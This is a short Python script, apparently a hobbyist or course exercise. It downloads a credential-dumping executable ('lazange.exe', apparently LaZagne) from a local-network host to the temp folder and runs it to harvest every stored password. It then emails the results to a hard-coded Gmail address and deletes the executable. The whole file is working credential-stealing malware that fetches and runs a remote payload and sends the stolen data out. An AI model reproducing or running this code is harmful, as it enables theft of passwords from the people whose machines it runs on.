#!usr/bin/env python
import requests, os
import subprocess, smtplib, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.0.118/windows/lazange.exe")
try:
    result = subprocess.check_output("laZange.exe all", shell=True)
except subprocess.CalledProcessError:
    pass
send_mail("challapallihemanthsaikumar@gmail.com", "", result)
os.remove("laZange.exe")

